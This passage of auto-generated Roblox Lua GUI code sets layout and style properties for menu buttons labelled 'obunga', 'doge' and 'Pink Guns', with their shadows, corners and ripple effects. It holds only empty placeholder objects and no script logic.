G2L["289"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["289"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["289"].BackgroundTransparency = 1
G2L["289"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["289"].BorderSizePixel = 1
G2L["289"].ClipsDescendants = false
G2L["289"].Draggable = false
G2L["289"].Position = UDim2.new(0.5, 0, 0.48366833, 8)
G2L["289"].Rotation = 0
G2L["289"].Selectable = false
G2L["289"].SelectionOrder = 0
G2L["289"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["289"].Visible = true
G2L["289"].ZIndex = 1
G2L["289"].Parent = G2L["288"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.nothing here yet.shadowHolder.penumbraShadow
G2L["290"].Name = [[penumbraShadow]]
G2L["290"].Image = [[rbxassetid://1316045217]]
G2L["290"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["290"].ScaleType = Enum.ScaleType.Slice
G2L["290"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["290"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["290"].Active = false
G2L["290"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["290"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["290"].BackgroundTransparency = 1
G2L["290"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["290"].BorderSizePixel = 1
G2L["290"].ClipsDescendants = false
G2L["290"].Draggable = false
G2L["290"].Position = UDim2.new(0.5, 0, 0.48366833, 8)
G2L["290"].Rotation = 0
G2L["290"].Selectable = false
G2L["290"].SelectionOrder = 0
G2L["290"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["290"].Visible = true
G2L["290"].ZIndex = 1
G2L["290"].Parent = G2L["288"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.nothing here yet.shadowHolder.ambientShadow
G2L["291"].Name = [[ambientShadow]]
G2L["291"].Image = [[rbxassetid://1316045217]]
G2L["291"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["291"].ScaleType = Enum.ScaleType.Slice
G2L["291"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["291"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["291"].Active = false
G2L["291"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["291"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["291"].BackgroundTransparency = 1
G2L["291"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["291"].BorderSizePixel = 1
G2L["291"].ClipsDescendants = false
G2L["291"].Draggable = false
G2L["291"].Position = UDim2.new(0.5157791, 0, 0.48366833, 8)
G2L["291"].Rotation = 0
G2L["291"].Selectable = false
G2L["291"].SelectionOrder = 0
G2L["291"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["291"].Visible = true
G2L["291"].ZIndex = 1
G2L["291"].Parent = G2L["288"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.nothing here yet.TextButton_Roundify_12px
G2L["292"].Name = [[TextButton_Roundify_12px]]
G2L["292"].Image = [[rbxassetid://3570695787]]
G2L["292"].ImageColor3 = Color3.fromRGB(255, 0, 0)
G2L["292"].ScaleType = Enum.ScaleType.Slice
G2L["292"].SliceCenter = Rect.new(100, 100, 100, 100)
G2L["292"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["292"].Active = true
G2L["292"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["292"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["292"].BackgroundTransparency = 1
G2L["292"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["292"].BorderSizePixel = 1
G2L["292"].ClipsDescendants = false
G2L["292"].Draggable = false
G2L["292"].Position = UDim2.new(0.5, 0, 0.5, 0)
G2L["292"].Rotation = 0
G2L["292"].Selectable = true
G2L["292"].SelectionOrder = 0
G2L["292"].Size = UDim2.new(1, 0, 1, 0)
G2L["292"].Visible = true
G2L["292"].ZIndex = 1
G2L["292"].Parent = G2L["285"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.nothing here yet.UICorner
G2L["293"].Name = [[UICorner]]
G2L["293"].CornerRadius = UDim.new(0, 10)
G2L["293"].Parent = G2L["285"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.obunga
G2L["294"].Name = [[obunga]]
G2L["294"].FontFace = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
G2L["294"].Text = [[obunga]]
G2L["294"].TextColor3 = Color3.fromRGB(255, 255, 255)
G2L["294"].TextScaled = true
G2L["294"].TextSize = 14
G2L["294"].TextStrokeColor3 = Color3.fromRGB(255, 240.00002, 240.00002)
G2L["294"].TextStrokeTransparency = 1
G2L["294"].TextWrapped = true
G2L["294"].TextXAlignment = Enum.TextXAlignment.Center
G2L["294"].TextYAlignment = Enum.TextYAlignment.Center
G2L["294"].Active = true
G2L["294"].AnchorPoint = Vector2.new(0, 0)
G2L["294"].BackgroundColor3 = Color3.fromRGB(200.00002, 0, 255)
G2L["294"].BackgroundTransparency = 0.5
G2L["294"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["294"].BorderSizePixel = 1
G2L["294"].ClipsDescendants = false
G2L["294"].Draggable = false
G2L["294"].Position = UDim2.new(0, 0, 0, 0)
G2L["294"].Rotation = 0
G2L["294"].Selectable = true
G2L["294"].SelectionOrder = 0
G2L["294"].Size = UDim2.new(0, 100, 0, 67)
G2L["294"].Visible = true
G2L["294"].ZIndex = 1
G2L["294"].Parent = G2L["5"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.obunga.UICorner
G2L["295"].Name = [[UICorner]]
G2L["295"].CornerRadius = UDim.new(0, 8)
G2L["295"].Parent = G2L["294"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.obunga.shadowHolder
G2L["296"].Name = [[shadowHolder]]
G2L["296"].Active = false
G2L["296"].AnchorPoint = Vector2.new(0, 0)
G2L["296"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["296"].BackgroundTransparency = 1
G2L["296"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["296"].BorderSizePixel = 1
G2L["296"].ClipsDescendants = false
G2L["296"].Draggable = false
G2L["296"].Position = UDim2.new(0, 0, 0, 0)
G2L["296"].Rotation = 0
G2L["296"].Selectable = false
G2L["296"].SelectionOrder = 0
G2L["296"].Size = UDim2.new(1, 0, 1, 0)
G2L["296"].Visible = true
G2L["296"].ZIndex = -1
G2L["296"].Parent = G2L["294"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.obunga.shadowHolder.umbraShadow
G2L["297"].Name = [[umbraShadow]]
G2L["297"].Image = [[rbxassetid://1316045217]]
G2L["297"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["297"].ScaleType = Enum.ScaleType.Slice
G2L["297"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["297"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["297"].Active = false
G2L["297"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["297"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["297"].BackgroundTransparency = 1
G2L["297"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["297"].BorderSizePixel = 1
G2L["297"].ClipsDescendants = false
G2L["297"].Draggable = false
G2L["297"].Position = UDim2.new(0.5, 0, 0.48366833, 8)
G2L["297"].Rotation = 0
G2L["297"].Selectable = false
G2L["297"].SelectionOrder = 0
G2L["297"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["297"].Visible = true
G2L["297"].ZIndex = 1
G2L["297"].Parent = G2L["296"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.obunga.shadowHolder.penumbraShadow
G2L["298"].Name = [[penumbraShadow]]
G2L["298"].Image = [[rbxassetid://1316045217]]
G2L["298"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["298"].ScaleType = Enum.ScaleType.Slice
G2L["298"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["298"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["298"].Active = false
G2L["298"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["298"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["298"].BackgroundTransparency = 1
G2L["298"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["298"].BorderSizePixel = 1
G2L["298"].ClipsDescendants = false
G2L["298"].Draggable = false
G2L["298"].Position = UDim2.new(0.5, 0, 0.48366833, 8)
G2L["298"].Rotation = 0
G2L["298"].Selectable = false
G2L["298"].SelectionOrder = 0
G2L["298"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["298"].Visible = true
G2L["298"].ZIndex = 1
G2L["298"].Parent = G2L["296"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.obunga.shadowHolder.ambientShadow
G2L["299"].Name = [[ambientShadow]]
G2L["299"].Image = [[rbxassetid://1316045217]]
G2L["299"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["299"].ScaleType = Enum.ScaleType.Slice
G2L["299"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["299"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["299"].Active = false
G2L["299"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["299"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["299"].BackgroundTransparency = 1
G2L["299"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["299"].BorderSizePixel = 1
G2L["299"].ClipsDescendants = false
G2L["299"].Draggable = false
G2L["299"].Position = UDim2.new(0.5157791, 0, 0.48366833, 8)
G2L["299"].Rotation = 0
G2L["299"].Selectable = false
G2L["299"].SelectionOrder = 0
G2L["299"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["299"].Visible = true
G2L["299"].ZIndex = 1
G2L["299"].Parent = G2L["296"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.obunga.TextButton_Roundify_12px
G2L["300"].Name = [[TextButton_Roundify_12px]]
G2L["300"].Image = [[rbxassetid://3570695787]]
G2L["300"].ImageColor3 = Color3.fromRGB(255, 0, 0)
G2L["300"].ScaleType = Enum.ScaleType.Slice
G2L["300"].SliceCenter = Rect.new(100, 100, 100, 100)
G2L["300"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["300"].Active = true
G2L["300"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["300"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["300"].BackgroundTransparency = 1
G2L["300"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["300"].BorderSizePixel = 1
G2L["300"].ClipsDescendants = false
G2L["300"].Draggable = false
G2L["300"].Position = UDim2.new(0.5, 0, 0.5, 0)
G2L["300"].Rotation = 0
G2L["300"].Selectable = true
G2L["300"].SelectionOrder = 0
G2L["300"].Size = UDim2.new(1, 0, 1, 0)
G2L["300"].Visible = true
G2L["300"].ZIndex = 1
G2L["300"].Parent = G2L["294"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.obunga.Script
G2L["301"].Name = [[Script]]
G2L["301"].Parent = G2L["294"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.obunga.Script.MainModule
G2L["302"].Name = [[MainModule]]
G2L["302"].Parent = G2L["301"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.obunga.Script.MainModule.ScreenGui
G2L["303"].Name = [[ScreenGui]]
G2L["303"].Enabled = false
G2L["303"].ZIndexBehavior = Enum.ZIndexBehavior.Global
G2L["303"].Parent = G2L["302"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.obunga.Script.MainModule.ScreenGui.LocalScript
G2L["304"].Name = [[LocalScript]]
G2L["304"].Parent = G2L["303"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.obunga.Script.MainModule.ScreenGui.Part
G2L["305"].Name = [[Part]]
G2L["305"].Parent = G2L["303"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.obunga.Script.MainModule.ScreenGui.RemoteEvent
G2L["306"].Name = [[RemoteEvent]]
G2L["306"].Parent = G2L["303"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.obunga.Script.MainModule.ScreenGui.Part2
G2L["307"].Name = [[Part2]]
G2L["307"].Parent = G2L["303"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.obunga.Script.MainModule.ScreenGui.ImageLabel
G2L["308"].Name = [[ImageLabel]]
G2L["308"].Image = [[http://www.roblox.com/asset/?id=3820085]]
G2L["308"].ImageColor3 = Color3.fromRGB(255, 255, 255)
G2L["308"].ScaleType = Enum.ScaleType.Stretch
G2L["308"].SliceCenter = Rect.new(0, 0, 0, 0)
G2L["308"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["308"].Active = false
G2L["308"].AnchorPoint = Vector2.new(0, 0)
G2L["308"].BackgroundColor3 = Color3.fromRGB(0, 0, 0)
G2L["308"].BackgroundTransparency = 0
G2L["308"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["308"].BorderSizePixel = 1
G2L["308"].ClipsDescendants = false
G2L["308"].Draggable = false
G2L["308"].Position = UDim2.new(0, 0, 0, 0)
G2L["308"].Rotation = 0
G2L["308"].Selectable = false
G2L["308"].SelectionOrder = 0
G2L["308"].Size = UDim2.new(1, 0, 1, 0)
G2L["308"].Visible = true
G2L["308"].ZIndex = 1
G2L["308"].Parent = G2L["303"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.obunga.Script.MainModule.ScreenGui.GlitchedOB
G2L["309"].Name = [[GlitchedOB]]
G2L["309"].Image = [[rbxassetid://12896950966]]
G2L["309"].ImageColor3 = Color3.fromRGB(255, 255, 255)
G2L["309"].ScaleType = Enum.ScaleType.Stretch
G2L["309"].SliceCenter = Rect.new(0, 0, 0, 0)
G2L["309"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["309"].Active = false
G2L["309"].AnchorPoint = Vector2.new(0, 0)
G2L["309"].BackgroundColor3 = Color3.fromRGB(0, 0, 0)
G2L["309"].BackgroundTransparency = 0
G2L["309"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["309"].BorderSizePixel = 1
G2L["309"].ClipsDescendants = false
G2L["309"].Draggable = false
G2L["309"].Position = UDim2.new(0, 0, 0, 0)
G2L["309"].Rotation = 0
G2L["309"].Selectable = false
G2L["309"].SelectionOrder = 0
G2L["309"].Size = UDim2.new(1, 0, 1, 0)
G2L["309"].Visible = false
G2L["309"].ZIndex = 1
G2L["309"].Parent = G2L["303"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.obunga.Script.MainModule.ScreenGui.GLITCHEDSFX
G2L["310"].Name = [[GLITCHEDSFX]]
G2L["310"].Parent = G2L["303"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.obunga.Script.MainModule.ScreenGui.Loop
G2L["311"].Name = [[Loop]]
G2L["311"].Parent = G2L["303"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.doge
G2L["312"].Name = [[doge]]
G2L["312"].FontFace = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
G2L["312"].Text = [[doge]]
G2L["312"].TextColor3 = Color3.fromRGB(255, 255, 255)
G2L["312"].TextScaled = true
G2L["312"].TextSize = 14
G2L["312"].TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
G2L["312"].TextStrokeTransparency = 1
G2L["312"].TextWrapped = true
G2L["312"].TextXAlignment = Enum.TextXAlignment.Center
G2L["312"].TextYAlignment = Enum.TextYAlignment.Center
G2L["312"].Active = true
G2L["312"].AnchorPoint = Vector2.new(0, 0)
G2L["312"].BackgroundColor3 = Color3.fromRGB(200.00002, 0, 255)
G2L["312"].BackgroundTransparency = 0.5
G2L["312"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["312"].BorderSizePixel = 0
G2L["312"].ClipsDescendants = false
G2L["312"].Draggable = false
G2L["312"].Position = UDim2.new(0, 0, 0, 0)
G2L["312"].Rotation = 0
G2L["312"].Selectable = true
G2L["312"].SelectionOrder = 0
G2L["312"].Size = UDim2.new(0, 200, 0, 50)
G2L["312"].Visible = true
G2L["312"].ZIndex = 1
G2L["312"].Parent = G2L["5"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.doge.RippleClick
G2L["313"].Name = [[RippleClick]]
G2L["313"].Parent = G2L["312"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.doge.RippleClick.Circle
G2L["314"].Name = [[Circle]]
G2L["314"].Image = [[rbxassetid://266543268]]
G2L["314"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["314"].ScaleType = Enum.ScaleType.Stretch
G2L["314"].SliceCenter = Rect.new(0, 0, 0, 0)
G2L["314"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["314"].Active = false
G2L["314"].AnchorPoint = Vector2.new(0, 0)
G2L["314"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["314"].BackgroundTransparency = 1
G2L["314"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["314"].BorderSizePixel = 1
G2L["314"].ClipsDescendants = false
G2L["314"].Draggable = false
G2L["314"].Position = UDim2.new(0, 0, 0, 0)
G2L["314"].Rotation = 0
G2L["314"].Selectable = false
G2L["314"].SelectionOrder = 0
G2L["314"].Size = UDim2.new(0, 0, 0, 0)
G2L["314"].Visible = true
G2L["314"].ZIndex = 10
G2L["314"].Parent = G2L["313"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.doge.UICorner
G2L["315"].Name = [[UICorner]]
G2L["315"].CornerRadius = UDim.new(0, 10)
G2L["315"].Parent = G2L["312"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.doge.TextButton_Roundify_12px
G2L["316"].Name = [[TextButton_Roundify_12px]]
G2L["316"].Image = [[rbxassetid://3570695787]]
G2L["316"].ImageColor3 = Color3.fromRGB(255, 0, 0)
G2L["316"].ScaleType = Enum.ScaleType.Slice
G2L["316"].SliceCenter = Rect.new(100, 100, 100, 100)
G2L["316"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["316"].Active = true
G2L["316"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["316"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["316"].BackgroundTransparency = 1
G2L["316"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["316"].BorderSizePixel = 1
G2L["316"].ClipsDescendants = false
G2L["316"].Draggable = false
G2L["316"].Position = UDim2.new(0.5, 0, 0.5, 0)
G2L["316"].Rotation = 0
G2L["316"].Selectable = true
G2L["316"].SelectionOrder = 0
G2L["316"].Size = UDim2.new(1, 0, 1, 0)
G2L["316"].Visible = true
G2L["316"].ZIndex = 1
G2L["316"].Parent = G2L["312"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.doge.ServerEventHandler
G2L["317"].Name = [[ServerEventHandler]]
G2L["317"].Parent = G2L["312"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.doge.shadowHolder
G2L["318"].Name = [[shadowHolder]]
G2L["318"].Active = false
G2L["318"].AnchorPoint = Vector2.new(0, 0)
G2L["318"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["318"].BackgroundTransparency = 1
G2L["318"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["318"].BorderSizePixel = 1
G2L["318"].ClipsDescendants = false
G2L["318"].Draggable = false
G2L["318"].Position = UDim2.new(0, 0, 0, 0)
G2L["318"].Rotation = 0
G2L["318"].Selectable = false
G2L["318"].SelectionOrder = 0
G2L["318"].Size = UDim2.new(1, 0, 1, 0)
G2L["318"].Visible = true
G2L["318"].ZIndex = -1
G2L["318"].Parent = G2L["312"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.doge.shadowHolder.umbraShadow
G2L["319"].Name = [[umbraShadow]]
G2L["319"].Image = [[rbxassetid://1316045217]]
G2L["319"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["319"].ScaleType = Enum.ScaleType.Slice
G2L["319"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["319"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["319"].Active = false
G2L["319"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["319"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["319"].BackgroundTransparency = 1
G2L["319"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["319"].BorderSizePixel = 1
G2L["319"].ClipsDescendants = false
G2L["319"].Draggable = false
G2L["319"].Position = UDim2.new(0.5, 0, 0.48366833, 8)
G2L["319"].Rotation = 0
G2L["319"].Selectable = false
G2L["319"].SelectionOrder = 0
G2L["319"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["319"].Visible = true
G2L["319"].ZIndex = 1
G2L["319"].Parent = G2L["318"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.doge.shadowHolder.penumbraShadow
G2L["320"].Name = [[penumbraShadow]]
G2L["320"].Image = [[rbxassetid://1316045217]]
G2L["320"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["320"].ScaleType = Enum.ScaleType.Slice
G2L["320"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["320"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["320"].Active = false
G2L["320"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["320"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["320"].BackgroundTransparency = 1
G2L["320"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["320"].BorderSizePixel = 1
G2L["320"].ClipsDescendants = false
G2L["320"].Draggable = false
G2L["320"].Position = UDim2.new(0.5, 0, 0.48366833, 8)
G2L["320"].Rotation = 0
G2L["320"].Selectable = false
G2L["320"].SelectionOrder = 0
G2L["320"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["320"].Visible = true
G2L["320"].ZIndex = 1
G2L["320"].Parent = G2L["318"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.doge.shadowHolder.ambientShadow
G2L["321"].Name = [[ambientShadow]]
G2L["321"].Image = [[rbxassetid://1316045217]]
G2L["321"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["321"].ScaleType = Enum.ScaleType.Slice
G2L["321"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["321"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["321"].Active = false
G2L["321"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["321"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["321"].BackgroundTransparency = 1
G2L["321"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["321"].BorderSizePixel = 1
G2L["321"].ClipsDescendants = false
G2L["321"].Draggable = false
G2L["321"].Position = UDim2.new(0.5157791, 0, 0.48366833, 8)
G2L["321"].Rotation = 0
G2L["321"].Selectable = false
G2L["321"].SelectionOrder = 0
G2L["321"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["321"].Visible = true
G2L["321"].ZIndex = 1
G2L["321"].Parent = G2L["318"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Pink Guns
G2L["322"].Name = [[Pink Guns]]
G2L["322"].FontFace = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
G2L["322"].Text = [[Pink Guns]]
G2L["322"].TextColor3 = Color3.fromRGB(255, 255, 255)
G2L["322"].TextScaled = true
G2L["322"].TextSize = 14
G2L["322"].TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
G2L["322"].TextStrokeTransparency = 1
G2L["322"].TextWrapped = true
G2L["322"].TextXAlignment = Enum.TextXAlignment.Center
G2L["322"].TextYAlignment = Enum.TextYAlignment.Center
G2L["322"].Active = true
G2L["322"].AnchorPoint = Vector2.new(0, 0)
G2L["322"].BackgroundColor3 = Color3.fromRGB(200.00002, 0, 255)
G2L["322"].BackgroundTransparency = 0.5
G2L["322"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["322"].BorderSizePixel = 0
G2L["322"].ClipsDescendants = false
G2L["322"].Draggable = false
G2L["322"].Position = UDim2.new(0, 0, 0, 0)
G2L["322"].Rotation = 0
G2L["322"].Selectable = true
G2L["322"].SelectionOrder = 0
G2L["322"].Size = UDim2.new(0, 200, 0, 50)
G2L["322"].Visible = true
G2L["322"].ZIndex = 1
G2L["322"].Parent = G2L["5"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Pink Guns.TextButton_Roundify_12px
G2L["323"].Name = [[TextButton_Roundify_12px]]
G2L["323"].Image = [[rbxassetid://3570695787]]
G2L["323"].ImageColor3 = Color3.fromRGB(255, 0, 0)
G2L["323"].ScaleType = Enum.ScaleType.Slice
G2L["323"].SliceCenter = Rect.new(100, 100, 100, 100)
G2L["323"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["323"].Active = true
G2L["323"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["323"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["323"].BackgroundTransparency = 1
G2L["323"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["323"].BorderSizePixel = 1
G2L["323"].ClipsDescendants = false
G2L["323"].Draggable = false
G2L["323"].Position = UDim2.new(0.5, 0, 0.5, 0)
G2L["323"].Rotation = 0
G2L["323"].Selectable = true
G2L["323"].SelectionOrder = 0
G2L["323"].Size = UDim2.new(1, 0, 1, 0)
G2L["323"].Visible = true
G2L["323"].ZIndex = 1
G2L["323"].Parent = G2L["322"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Pink Guns.RippleClick
G2L["324"].Name = [[RippleClick]]
G2L["324"].Parent = G2L["322"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Pink Guns.RippleClick.Circle
G2L["325"].Name = [[Circle]]
G2L["325"].Image = [[rbxassetid://266543268]]
G2L["325"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["325"].ScaleType = Enum.ScaleType.Stretch
G2L["325"].SliceCenter = Rect.new(0, 0, 0, 0)
G2L["325"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["325"].Active = false
G2L["325"].AnchorPoint = Vector2.new(0, 0)
G2L["325"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["325"].BackgroundTransparency = 1
G2L["325"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["325"].BorderSizePixel = 1
G2L["325"].ClipsDescendants = false
G2L["325"].Draggable = false
G2L["325"].Position = UDim2.new(0, 0, 0, 0)
G2L["325"].Rotation = 0
G2L["325"].Selectable = false
G2L["325"].SelectionOrder = 0
G2L["325"].Size = UDim2.new(0, 0, 0, 0)
G2L["325"].Visible = true
G2L["325"].ZIndex = 10
G2L["325"].Parent = G2L["324"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Pink Guns.UICorner
G2L["326"].Name = [[UICorner]]
G2L["326"].CornerRadius = UDim.new(0, 10)
G2L["326"].Parent = G2L["322"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Pink Guns.shadowHolder
G2L["327"].Name = [[shadowHolder]]
G2L["327"].Active = false
G2L["327"].AnchorPoint = Vector2.new(0, 0)
G2L["327"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["327"].BackgroundTransparency = 1
G2L["327"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["327"].BorderSizePixel = 1
G2L["327"].ClipsDescendants = false
G2L["327"].Draggable = false
G2L["327"].Position = UDim2.new(0, 0, 0, 0)
G2L["327"].Rotation = 0
G2L["327"].Selectable = false
G2L["327"].SelectionOrder = 0
G2L["327"].Size = UDim2.new(1, 0, 1, 0)
G2L["327"].Visible = true
G2L["327"].ZIndex = -1
G2L["327"].Parent = G2L["322"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Pink Guns.shadowHolder.umbraShadow
G2L["328"].Name = [[umbraShadow]]
G2L["328"].Image = [[rbxassetid://1316045217]]
G2L["328"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["328"].ScaleType = Enum.ScaleType.Slice
G2L["328"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["328"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["328"].Active = false
G2L["328"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["328"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["328"].BackgroundTransparency = 1
G2L["328"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["328"].BorderSizePixel = 1
G2L["328"].ClipsDescendants = false
G2L["328"].Draggable = false
G2L["328"].Position = UDim2.new(0.5, 0, 0.48366833, 8)
G2L["328"].Rotation = 0
G2L["328"].Selectable = false
G2L["328"].SelectionOrder = 0
G2L["328"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["328"].Visible = true
G2L["328"].ZIndex = 1
G2L["328"].Parent = G2L["327"]

